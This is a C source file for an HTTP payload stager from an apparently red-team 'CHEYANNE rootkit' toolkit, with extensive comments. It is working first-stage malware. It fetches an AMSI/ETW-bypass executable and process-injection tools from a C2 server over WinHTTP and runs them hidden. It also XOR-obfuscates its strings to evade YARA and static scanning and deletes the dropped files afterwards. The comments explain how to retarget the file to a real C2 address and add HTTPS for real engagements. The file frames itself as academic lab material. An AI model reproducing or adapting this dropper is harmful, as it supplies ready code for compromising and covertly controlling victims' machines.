/*
 * http_stager_annotated.c — HTTP Payload Stager (Annotated Reference)
 * ═══════════════════════════════════════════════════════════════════════
 * CHEYANNE ROOTKIT — 22DIV / george wu
 * Classification: UNCLASSIFIED // ACADEMIC USE ONLY
 *
 * PURPOSE:
 *   Minimal HTTP stager that downloads and executes CHEYANNE payloads from
 *   a C2 server. First-stage dropper — small footprint, XOR-obfuscated
 *   strings, no plaintext IOCs in the binary.
 *
 *   Callsign: INDIA
 *
 *   Download chain:
 *     1. dark_room.exe   — AMSI+ETW bypass (primary payload)
 *     2. cheyanne_inject.dll — process injection DLL (optional)
 *     3. cheyanne_inject.exe — injection loader (optional)
 *
 *   Evidence:
 *     Canary file at C:\Windows\Temp\cheyanne_stager_canary.txt
 *     Tagged [INDIA] with timestamp, PID, username, payload path
 *
 * THEORY:
 *   The stager is the insertion vector. It's tiny, generic-looking,
 *   and disposable. Its only job is to pull the real tools from the
 *   C2 server and get them running. Think of it as the breach charge
 *   on the door — it opens the way, the assault team does the work.
 *
 *   All strings are XOR-encoded (key 0x88) so static analysis / YARA
 *   rules can't grep for "WinHttpOpen" or "cheyanne_payload.exe" in the
 *   binary. Strings are decoded on the stack at runtime, used, then
 *   zeroed. Brief exposure window only.
 *
 * PREREQUISITES:
 *   C2 server running: python stagers\cheyanne_serve.py [port]
 *   Payloads compiled in their respective directories
 *
 * COMPILE:
 *   cl.exe stagers\http_stager_annotated.c /Fe:stagers\cheyanne_stager.exe /O1 /GS- /utf-8 /link winhttp.lib
 *
 * USAGE:
 *   cheyanne_stager.exe                  (default: 127.0.0.1:8080)
 *   cheyanne_stager.exe --test           (download + verify, don't execute)
 *   cheyanne_stager.exe --inject         (also download injection tools)
 *
 * SIZE TARGET: <50KB compiled
 *
 * ═══════════════════════════════════════════════════════════════════════
 */

#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <string.h>

/* linked at compile: cl.exe /link winhttp.lib */

/* ═══════════════════════════════════════════════════════════════════════
 * C2 CONFIGURATION
 * ═══════════════════════════════════════════════════════════════════════
 *
 * Default C2 address. Override with #define before including, or change
 * here for deployment. XOR-encoded version below is what lives in the
 * binary — this #define is just for the WinHttpConnect port parameter
 * and for documentation.
 *
 * For non-localhost deployment, re-encode the IP with key 0x88:
 *   python -c "print([hex(b ^ 0x88) for b in b'10.0.0.5'])"
 * ═══════════════════════════════════════════════════════════════════════ */

#ifndef C2_HOST
#define C2_HOST  "127.0.0.1"
#endif

#ifndef C2_PORT
#define C2_PORT  8080
#endif

/* ═══════════════════════════════════════════════════════════════════════
 * XOR STRING OBFUSCATION — Key 0x88, Callsign INDIA
 * ═══════════════════════════════════════════════════════════════════════
 *
 * Every string that would be a signature in the binary is XOR-encoded
 * at compile time. Decoded on the stack at runtime, used, then zeroed.
 *
 * Pattern matches dark_room_annotated.c — same xor_decode function,
 * same const array + length macro convention.
 *
 * XOR key 0x88 chosen to differ from dark_room's 0x41 — if an analyst
 * finds one key, they don't automatically decode all CHEYANNE binaries.
 * ═══════════════════════════════════════════════════════════════════════ */

#define XOR_KEY 0x88

/* ── C2 Address ────────────────────────────────────────────────────── */

/* "127.0.0.1" XOR 0x88 */
static const unsigned char xC2Host[] = {
    0xB9, 0xBA, 0xBF, 0xA6, 0xB8, 0xA6, 0xB8, 0xA6, 0xB9
};
#define xC2Host_LEN 9

/* ── URL Paths ─────────────────────────────────────────────────────── */

/* "/dark_room" XOR 0x88 — primary payload endpoint */
static const unsigned char xPathDarkRoom[] = {
    0xA7, 0xEC, 0xE9, 0xFA, 0xE3, 0xD7, 0xFA, 0xE7, 0xE7, 0xE5
};
#define xPathDarkRoom_LEN 10

/* "/inject_dll" XOR 0x88 — injection DLL endpoint */
static const unsigned char xPathInjectDll[] = {
    0xA7, 0xE1, 0xE6, 0xE2, 0xED, 0xEB, 0xFC, 0xD7, 0xEC, 0xE4, 0xE4
};
#define xPathInjectDll_LEN 11

/* "/inject_exe" XOR 0x88 — injection loader endpoint */
static const unsigned char xPathInjectExe[] = {
    0xA7, 0xE1, 0xE6, 0xE2, 0xED, 0xEB, 0xFC, 0xD7, 0xED, 0xF0, 0xED
};
#define xPathInjectExe_LEN 11

/* ── Local Filenames ───────────────────────────────────────────────── */

/* "cheyanne_payload.exe" XOR 0x88 — what we save dark_room as locally */
static const unsigned char xPayloadName[] = {
    0xFE, 0xE9, 0xEC, 0xED, 0xFA, 0xD7, 0xF8, 0xE9, 0xF1, 0xE4,
    0xE7, 0xE9, 0xEC, 0xA6, 0xED, 0xF0, 0xED
};
#define xPayloadName_LEN 17

/* "cheyanne_inject.dll" XOR 0x88 */
static const unsigned char xInjectDllName[] = {
    0xFE, 0xE9, 0xEC, 0xED, 0xFA, 0xD7, 0xE1, 0xE6, 0xE2, 0xED,
    0xEB, 0xFC, 0xA6, 0xEC, 0xE4, 0xE4
};
#define xInjectDllName_LEN 16

/* "cheyanne_inject.exe" XOR 0x88 */
static const unsigned char xInjectExeName[] = {
    0xFE, 0xE9, 0xEC, 0xED, 0xFA, 0xD7, 0xE1, 0xE6, 0xE2, 0xED,
    0xEB, 0xFC, 0xA6, 0xED, 0xF0, 0xED
};
#define xInjectExeName_LEN 16

/* ── Environment Variable ──────────────────────────────────────────── */

/* "TEMP" XOR 0x88 — to resolve %TEMP% directory */
static const unsigned char xTempEnv[] = {
    0xDC, 0xCD, 0xC5, 0xD8
};
#define xTempEnv_LEN 4

/* ── User-Agent ────────────────────────────────────────────────────── */

/* "Mozilla/5.0 (CHEYANNE)" XOR 0x88 — looks normal enough in traffic */
static const unsigned char xUserAgent[] = {
    0xC5, 0xE7, 0xF2, 0xE1, 0xE4, 0xE4, 0xE9, 0xA7, 0xBD, 0xA6,
    0xB8, 0xA8, 0xA0, 0xDE, 0xC9, 0xCC, 0xCD, 0xDA, 0xA1
};
#define xUserAgent_LEN 19

/* ── Canary ────────────────────────────────────────────────────────── */

/* "C:\Windows\Temp\cheyanne_stager_canary.txt" XOR 0x88 */
static const unsigned char xCanaryPath[] = {
    0xCB, 0xB2, 0xD4, 0xDF, 0xE1, 0xE6, 0xEC, 0xE7, 0xFF, 0xFB,
    0xD4, 0xDC, 0xED, 0xE5, 0xF8, 0xD4, 0xFE, 0xE9, 0xEC, 0xED,
    0xFA, 0xD7, 0xFB, 0xFC, 0xE9, 0xEF, 0xED, 0xFA, 0xD7, 0xEB,
    0xE9, 0xE6, 0xE9, 0xFA, 0xF1, 0xA6, 0xFC, 0xF0, 0xFC
};
#define xCanaryPath_LEN 39

/* "[INDIA]" XOR 0x88 — callsign tag for canary */
static const unsigned char xCallsign[] = {
    0xD3, 0xC1, 0xC6, 0xCC, 0xC1, 0xC9, 0xD5
};
#define xCallsign_LEN 7

/* ═══════════════════════════════════════════════════════════════════════
 * XOR DECODE — same pattern as dark_room_annotated.c
 * ═══════════════════════════════════════════════════════════════════════
 *
 * Single-byte XOR. Not cryptographically strong — it's obfuscation,
 * not encryption. Purpose: defeat static string scanning (strings.exe,
 * YARA rules, grep). An analyst with the binary and a hex editor will
 * find the key in minutes. That's fine — this isn't about defeating
 * skilled humans, it's about defeating automated scanners.
 * ═══════════════════════════════════════════════════════════════════════ */

static void xor_decode(unsigned char *buf, int len) {
    int i;
    for (i = 0; i < len; i++) buf[i] ^= XOR_KEY;
}

/* ═══════════════════════════════════════════════════════════════════════
 * CONSOLE OUTPUT HELPERS
 * ═══════════════════════════════════════════════════════════════════════ */

static HANDLE hStdOut;
static void color(WORD c) { SetConsoleTextAttribute(hStdOut, c); }

#define RED     (FOREGROUND_RED | FOREGROUND_INTENSITY)
#define GREEN   (FOREGROUND_GREEN | FOREGROUND_INTENSITY)
#define YELLOW  (FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY)
#define CYAN    (FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY)
#define WHITE   (FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY)

/* ═══════════════════════════════════════════════════════════════════════
 * PHASE 1: BUILD LOCAL PATH
 * ═══════════════════════════════════════════════════════════════════════
 *
 * Construct the full path where the downloaded payload will be saved.
 * We use %TEMP% because:
 *   - Standard user always has write access
 *   - Files there don't look suspicious (installers use it constantly)
 *   - Path is per-user, so different users don't collide
 *
 * Result: C:\Users\<user>\AppData\Local\Temp\cheyanne_payload.exe
 * ═══════════════════════════════════════════════════════════════════════ */

static BOOL build_local_path(char *outPath, int maxLen,
                              const unsigned char *xFilename, int fnLen) {
    char tempDir[MAX_PATH];
    unsigned char envVar[8];
    unsigned char filename[64];
    DWORD len;

    /* Decode "TEMP" environment variable name */
    memcpy(envVar, xTempEnv, xTempEnv_LEN);
    xor_decode(envVar, xTempEnv_LEN);
    envVar[xTempEnv_LEN] = 0;

    /* Get %TEMP% value */
    len = GetEnvironmentVariableA((char *)envVar, tempDir, MAX_PATH);
    memset(envVar, 0, sizeof(envVar));  /* zero decoded string */

    if (len == 0 || len >= MAX_PATH) {
        color(RED);
        printf("  [!] Failed to resolve %%TEMP%%: %lu\n", GetLastError());
        return FALSE;
    }

    /* Decode filename */
    memcpy(filename, xFilename, fnLen);
    xor_decode(filename, fnLen);
    filename[fnLen] = 0;

    /* Build full path: %TEMP%\<filename> */
    _snprintf(outPath, maxLen, "%s\\%s", tempDir, (char *)filename);
    outPath[maxLen - 1] = 0;

    /* Zero decoded filename from stack */
    memset(filename, 0, sizeof(filename));

    return TRUE;
}

/* ═══════════════════════════════════════════════════════════════════════
 * PHASE 2: HTTP DOWNLOAD — WinHTTP API
 * ═══════════════════════════════════════════════════════════════════════
 *
 * WinHTTP is the recommended HTTP client API for Windows services and
 * non-interactive applications. We use it instead of WinInet because:
 *   - WinInet is designed for interactive apps (IE settings, proxy UI)
 *   - WinHTTP is cleaner, fewer side effects, no IE dependency
 *   - WinHTTP works correctly from SYSTEM context
 *
 * The download flow:
 *   1. WinHttpOpen         — create session handle (user-agent string)
 *   2. WinHttpConnect      — connect to C2 host:port
 *   3. WinHttpOpenRequest  — create GET request for the URL path
 *   4. WinHttpSendRequest  — send the request over the wire
 *   5. WinHttpReceiveResponse — wait for the server's response
 *   6. WinHttpReadData     — read response body in chunks
 *   7. Write chunks to local file
 *   8. Close all handles
 *
 * No TLS in default config (HTTP, not HTTPS). For a real engagement,
 * add WINHTTP_FLAG_SECURE to WinHttpOpenRequest flags and handle
 * certificate validation. For localhost lab use, plaintext HTTP is fine.
 * ═══════════════════════════════════════════════════════════════════════ */

static BOOL download_file(const char *localPath,
                           const unsigned char *xUrlPath, int pathLen) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    DWORD bytesRead, bytesWritten, totalBytes = 0;
    unsigned char readBuf[4096];
    BOOL result = FALSE;

    /* ── Decode strings on stack ── */
    unsigned char urlPath[64];
    wchar_t wHost[64];
    wchar_t wPath[64];
    wchar_t wAgent[64];
    unsigned char hostBuf[64];
    unsigned char agentBuf[64];
    int i;

    /* Decode C2 host */
    memcpy(hostBuf, xC2Host, xC2Host_LEN);
    xor_decode(hostBuf, xC2Host_LEN);
    hostBuf[xC2Host_LEN] = 0;

    /* Decode URL path */
    memcpy(urlPath, xUrlPath, pathLen);
    xor_decode(urlPath, pathLen);
    urlPath[pathLen] = 0;

    /* Decode user-agent */
    memcpy(agentBuf, xUserAgent, xUserAgent_LEN);
    xor_decode(agentBuf, xUserAgent_LEN);
    agentBuf[xUserAgent_LEN] = 0;

    /* WinHTTP uses wide strings — convert from narrow */
    for (i = 0; i <= (int)xC2Host_LEN; i++)
        wHost[i] = (wchar_t)hostBuf[i];
    for (i = 0; i <= pathLen; i++)
        wPath[i] = (wchar_t)urlPath[i];
    for (i = 0; i <= (int)xUserAgent_LEN; i++)
        wAgent[i] = (wchar_t)agentBuf[i];

    /* Zero decoded narrow buffers immediately */
    memset(hostBuf, 0, sizeof(hostBuf));
    memset(urlPath, 0, sizeof(urlPath));
    memset(agentBuf, 0, sizeof(agentBuf));

    /* ── Step 1: Open session ──
     * WINHTTP_ACCESS_TYPE_DEFAULT_PROXY: use system proxy settings.
     * In a lab environment this means direct connection. In a corporate
     * network it would respect the configured proxy, which is actually
     * what we want — blends with normal HTTP traffic. */
    hSession = WinHttpOpen(wAgent,
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME,
                           WINHTTP_NO_PROXY_BYPASS,
                           0);
    if (!hSession) {
        color(RED);
        printf("  [!] WinHttpOpen failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* ── Step 2: Connect to C2 ──
     * Establishes a logical connection to the target host:port.
     * No network traffic yet — just sets up the connection context. */
    hConnect = WinHttpConnect(hSession, wHost, (INTERNET_PORT)C2_PORT, 0);
    if (!hConnect) {
        color(RED);
        printf("  [!] WinHttpConnect failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* ── Step 3: Create GET request ──
     * WINHTTP_NO_REFERER: no referrer header (cleaner request)
     * WINHTTP_DEFAULT_ACCEPT_TYPES: accept any content type
     * Flags = 0: no TLS (use WINHTTP_FLAG_SECURE for HTTPS) */
    hRequest = WinHttpOpenRequest(hConnect, L"GET", wPath,
                                   NULL,
                                   WINHTTP_NO_REFERER,
                                   WINHTTP_DEFAULT_ACCEPT_TYPES,
                                   0);
    if (!hRequest) {
        color(RED);
        printf("  [!] WinHttpOpenRequest failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* ── Step 4: Send the request ──
     * No additional headers, no request body (it's a GET).
     * This is where the actual TCP connection + HTTP request happens. */
    if (!WinHttpSendRequest(hRequest,
                             WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                             WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        color(RED);
        printf("  [!] WinHttpSendRequest failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* ── Step 5: Receive response ──
     * Blocks until the server sends response headers.
     * After this returns, we can read the response body. */
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        color(RED);
        printf("  [!] WinHttpReceiveResponse failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* ── Step 6: Open local file for writing ──
     * CREATE_ALWAYS: overwrite if exists (idempotent downloads) */
    hFile = CreateFileA(localPath, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        color(RED);
        printf("  [!] CreateFile failed for %s: %lu\n", localPath, GetLastError());
        goto cleanup;
    }

    /* ── Step 7: Read response body in chunks ──
     * 4KB buffer. Keep reading until WinHttpReadData returns 0 bytes.
     * Each chunk is written directly to the local file. No buffering
     * the entire payload in memory — works for any payload size. */
    while (1) {
        bytesRead = 0;
        if (!WinHttpReadData(hRequest, readBuf, sizeof(readBuf), &bytesRead))
            break;
        if (bytesRead == 0)
            break;  /* EOF — download complete */

        WriteFile(hFile, readBuf, bytesRead, &bytesWritten, NULL);
        totalBytes += bytesWritten;
    }

    if (totalBytes > 0) {
        color(GREEN);
        printf("  [+] Downloaded %lu bytes → %s\n", totalBytes, localPath);
        result = TRUE;
    } else {
        color(RED);
        printf("  [!] Downloaded 0 bytes — server returned empty response\n");
    }

cleanup:
    /* Zero the wide string buffers — decoded strings lived here */
    memset(wHost, 0, sizeof(wHost));
    memset(wPath, 0, sizeof(wPath));
    memset(wAgent, 0, sizeof(wAgent));

    /* ── Step 8: Close all handles ──
     * Reverse order of opening. WinHTTP handles are hierarchical:
     * request → connection → session */
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return result;
}

/* ═══════════════════════════════════════════════════════════════════════
 * PHASE 3: EXECUTE PAYLOAD — CreateProcessA
 * ═══════════════════════════════════════════════════════════════════════
 *
 * Standard process creation. No injection, no hollowing, no stealth.
 * The stager's job is delivery, not evasion — dark_room.exe handles
 * its own AMSI/ETW bypasses once it's running.
 *
 * CREATE_NO_WINDOW: payload runs without a visible console.
 * We DON'T wait for it (WaitForSingleObject) — the stager exits
 * after launching. Fire and forget.
 * ═══════════════════════════════════════════════════════════════════════ */

static BOOL execute_payload(const char *path) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    memset(&pi, 0, sizeof(pi));

    if (!CreateProcessA(NULL, (LPSTR)path, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        color(RED);
        printf("  [!] CreateProcess failed for %s: %lu\n", path, GetLastError());
        return FALSE;
    }

    color(GREEN);
    printf("  [+] Executed: %s (PID %lu)\n", path, pi.dwProcessId);

    /* Don't wait — let the payload run independently */
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return TRUE;
}

/* ═══════════════════════════════════════════════════════════════════════
 * PHASE 4: CANARY WRITE — Evidence of Execution
 * ═══════════════════════════════════════════════════════════════════════
 *
 * Write a canary file to prove the stager ran. This is the engagement
 * evidence — the file's existence + contents demonstrate:
 *   - The stager executed successfully
 *   - When it ran (timestamp)
 *   - What it downloaded (payload path)
 *   - What user context it ran under (username)
 *   - The PID of the stager process
 *
 * Tagged with callsign [INDIA] for grep-ability in the engagement log.
 *
 * Location: C:\Windows\Temp\ — writable by standard users, persists
 * across reboots, visible to all users (good for post-engagement review).
 * ═══════════════════════════════════════════════════════════════════════ */

static void write_canary(const char *payloadPath) {
    HANDLE hFile;
    SYSTEMTIME st;
    char canaryBuf[512];
    char username[64];
    DWORD usernameLen = sizeof(username);
    DWORD written;
    unsigned char canaryPath[128];
    unsigned char callsign[16];
    int len;

    /* Decode canary file path */
    memcpy(canaryPath, xCanaryPath, xCanaryPath_LEN);
    xor_decode(canaryPath, xCanaryPath_LEN);
    canaryPath[xCanaryPath_LEN] = 0;

    /* Decode callsign tag */
    memcpy(callsign, xCallsign, xCallsign_LEN);
    xor_decode(callsign, xCallsign_LEN);
    callsign[xCallsign_LEN] = 0;

    /* Get current timestamp */
    GetLocalTime(&st);

    /* Get username — shows privilege level in the evidence */
    if (!GetUserNameA(username, &usernameLen)) {
        strncpy(username, "UNKNOWN", sizeof(username));
    }

    /* Format canary content */
    len = _snprintf(canaryBuf, sizeof(canaryBuf),
        "%s CHEYANNE HTTP STAGER — Canary Evidence\r\n"
        "Timestamp:  %04d-%02d-%02d %02d:%02d:%02d\r\n"
        "PID:        %lu\r\n"
        "Username:   %s\r\n"
        "Payload:    %s\r\n"
        "Callsign:   INDIA\r\n"
        "Status:     STAGED\r\n",
        (char *)callsign,
        st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond,
        GetCurrentProcessId(),
        username,
        payloadPath ? payloadPath : "(none)");

    /* Write canary file */
    hFile = CreateFileA((char *)canaryPath, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile != INVALID_HANDLE_VALUE) {
        WriteFile(hFile, canaryBuf, (DWORD)len, &written, NULL);
        CloseHandle(hFile);
        color(GREEN);
        printf("  [+] Canary written: %s\n", (char *)canaryPath);
    } else {
        color(YELLOW);
        printf("  [*] Canary write failed (non-critical): %lu\n", GetLastError());
    }

    /* Zero decoded strings */
    memset(canaryPath, 0, sizeof(canaryPath));
    memset(callsign, 0, sizeof(callsign));
    memset(canaryBuf, 0, sizeof(canaryBuf));
}

/* ═══════════════════════════════════════════════════════════════════════
 * PHASE 5: SELF-CLEANUP — Delete Downloaded Files
 * ═══════════════════════════════════════════════════════════════════════
 *
 * Best-effort cleanup. Delete the downloaded payloads from %TEMP% after
 * execution. This reduces forensic evidence on disk.
 *
 * "Best-effort" because:
 *   - The payload might still be running (file locked by OS)
 *   - We don't wait for the payload to exit before deleting
 *   - Deletion might fail silently — that's acceptable
 *
 * A forensic analyst will still find evidence in:
 *   - MFT ($MFT) — file creation/deletion records persist
 *   - USN Journal — file change log
 *   - Prefetch — execution evidence in C:\Windows\Prefetch
 *   - WinHTTP trace — if enabled
 *   - The canary file (which we intentionally leave)
 *
 * This is anti-casual, not anti-forensic.
 * ═══════════════════════════════════════════════════════════════════════ */

static void cleanup_file(const char *path) {
    /* Short sleep to let the payload finish loading into memory.
     * If the file is locked by the child process, DeleteFile will fail.
     * 500ms is usually enough for the OS to finish the initial load. */
    Sleep(500);

    if (DeleteFileA(path)) {
        color(YELLOW);
        printf("  [*] Cleaned up: %s\n", path);
    } else {
        color(YELLOW);
        printf("  [*] Cleanup skipped (file in use or already gone): %s\n", path);
    }
}

/* ═══════════════════════════════════════════════════════════════════════
 * MAIN — Orchestrate the staging chain
 * ═══════════════════════════════════════════════════════════════════════
 *
 * Flow:
 *   1. Resolve %TEMP% paths for all payloads
 *   2. Download primary payload (dark_room.exe) from C2
 *   3. Execute primary payload
 *   4. Optionally download + execute injection tools
 *   5. Write canary evidence file
 *   6. Best-effort cleanup of downloaded files
 *   7. Exit — stager's job is done
 *
 * The stager itself is disposable. Once the payloads are running,
 * the stager process can die. It served its purpose.
 * ═══════════════════════════════════════════════════════════════════════ */

int main(int argc, char **argv) {
    char payloadPath[MAX_PATH];
    char injectDllPath[MAX_PATH];
    char injectExePath[MAX_PATH];
    int testMode = 0;
    int injectMode = 0;
    int i;
    BOOL dlOk;

    hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

    /* Parse flags */
    for (i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--test") == 0) testMode = 1;
        if (strcmp(argv[i], "--inject") == 0) injectMode = 1;
    }

#ifdef VDR_DEBUG
    /* ── Banner ── */
    color(CYAN);
    printf("\n");
    printf("  +======================================================+\n");
    printf("  |  CHEYANNE HTTP STAGER — 22DIV / george wu            |\n");
    printf("  |  Callsign: INDIA                                      |\n");
    printf("  +======================================================+\n");
    printf("  |  C2:     %s:%d", C2_HOST, C2_PORT);
    /* Pad to fixed width */
    {
        int padLen = 37 - (int)strlen(C2_HOST) - 5;
        int pi;
        if (padLen < 0) padLen = 0;
        for (pi = 0; pi < padLen; pi++) printf(" ");
    }
    printf("|\n");
    printf("  |  Target: %%TEMP%%\\cheyanne_payload.exe                |\n");
    printf("  |  Mode:   %s%s", testMode ? "TEST (no exec)" : "LIVE",
           injectMode ? " + INJECT" : "");
    /* Pad mode line */
    {
        int modeLen = (testMode ? 14 : 4) + (injectMode ? 10 : 0);
        int padLen = 42 - modeLen;
        int pi;
        if (padLen < 0) padLen = 0;
        for (pi = 0; pi < padLen; pi++) printf(" ");
    }
    printf("|\n");
    printf("  +======================================================+\n\n");
    color(WHITE);
#endif

    /* ── PHASE 1: Build local paths ── */
    printf("  --- PHASE 1: RESOLVE PATHS ---\n\n");

    if (!build_local_path(payloadPath, MAX_PATH,
                          xPayloadName, xPayloadName_LEN)) {
        color(RED);
        printf("  [!] Cannot resolve payload path. Aborting.\n");
        return 1;
    }
    color(GREEN);
    printf("  [+] Primary target: %s\n", payloadPath);

    if (injectMode) {
        build_local_path(injectDllPath, MAX_PATH,
                         xInjectDllName, xInjectDllName_LEN);
        build_local_path(injectExePath, MAX_PATH,
                         xInjectExeName, xInjectExeName_LEN);
        printf("  [+] Inject DLL:     %s\n", injectDllPath);
        printf("  [+] Inject EXE:     %s\n", injectExePath);
    }

    /* ── PHASE 2: Download from C2 ── */
    printf("\n  --- PHASE 2: DOWNLOAD PAYLOADS ---\n\n");

    color(YELLOW);
    printf("  [*] Contacting C2 at %s:%d...\n", C2_HOST, C2_PORT);

    dlOk = download_file(payloadPath, xPathDarkRoom, xPathDarkRoom_LEN);

    if (!dlOk) {
        color(RED);
        printf("  [!] Primary payload download FAILED. Aborting.\n");
        printf("  [!] Is the C2 server running? python stagers\\cheyanne_serve.py\n");
        return 1;
    }

    /* Download injection tools if requested */
    if (injectMode) {
        printf("\n");
        color(YELLOW);
        printf("  [*] Downloading injection toolkit...\n");
        download_file(injectDllPath, xPathInjectDll, xPathInjectDll_LEN);
        download_file(injectExePath, xPathInjectExe, xPathInjectExe_LEN);
    }

    /* ── PHASE 3: Execute ── */
    if (!testMode) {
        printf("\n  --- PHASE 3: EXECUTE ---\n\n");

        execute_payload(payloadPath);

        if (injectMode) {
            /* Small delay — let dark_room establish itself first */
            Sleep(1000);
            execute_payload(injectExePath);
        }
    } else {
        printf("\n  --- PHASE 3: SKIPPED (test mode) ---\n\n");
        color(YELLOW);
        printf("  [*] --test flag set. Payloads downloaded but NOT executed.\n");
        printf("  [*] Verify files exist at the paths above.\n");
    }

    /* ── PHASE 4: Canary ── */
    printf("\n  --- PHASE 4: EVIDENCE ---\n\n");
    write_canary(payloadPath);

    /* ── PHASE 5: Cleanup ── */
    if (!testMode) {
        printf("\n  --- PHASE 5: CLEANUP ---\n\n");
        cleanup_file(payloadPath);
        if (injectMode) {
            cleanup_file(injectDllPath);
            cleanup_file(injectExePath);
        }
    }

#ifdef VDR_DEBUG
    /* ── Done ── */
    printf("\n");
    color(GREEN);
    printf("  +======================================================+\n");
    printf("  |  STAGER COMPLETE — INDIA OUT                          |\n");
    printf("  +======================================================+\n");
    color(WHITE);
    printf("\n");
#endif

    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 * OPERATIONAL NOTES
 * ═══════════════════════════════════════════════════════════════════════
 *
 * DETECTION SURFACE:
 *   - WinHTTP API calls visible to API monitoring (ETW, Procmon)
 *   - File writes to %TEMP% visible to filesystem monitors
 *   - CreateProcessA visible to process creation hooks
 *   - Canary file is intentional evidence (left for engagement review)
 *
 * EVASION (what the stager does):
 *   - XOR-encoded strings: no plaintext IOCs in the binary
 *   - No import of winhttp.dll by name (uses pragma comment)
 *   - Self-cleanup of downloaded files after execution
 *   - Small binary size (<50KB) — less to scan, fewer signatures
 *   - Generic user-agent string in HTTP requests
 *
 * EVASION (what the stager does NOT do):
 *   - No in-memory execution (writes to disk — simple is intentional)
 *   - No process injection (CreateProcessA is straightforward)
 *   - No persistence (fire and forget — payload handles its own)
 *   - No encrypted C2 channel (HTTP, not HTTPS)
 *   - No anti-debug / anti-VM checks
 *
 * These are deliberate choices. The stager is a teaching tool that
 * demonstrates the staging concept clearly. Each missing evasion
 * technique is a future exercise.
 *
 * DEPLOYMENT WITH DARK_ROOM CHAIN:
 *   Terminal 1 (C2 server):
 *     cd cheyanne
 *     python stagers\cheyanne_serve.py 8080
 *
 *   Terminal 2 (stager):
 *     stagers\cheyanne_stager.exe
 *     stagers\cheyanne_stager.exe --inject    (with injection tools)
 *     stagers\cheyanne_stager.exe --test      (download only, verify)
 *
 *   Verification:
 *     type C:\Windows\Temp\cheyanne_stager_canary.txt
 *     dir %TEMP%\cheyanne_payload.exe
 *
 * ═══════════════════════════════════════════════════════════════════════ */
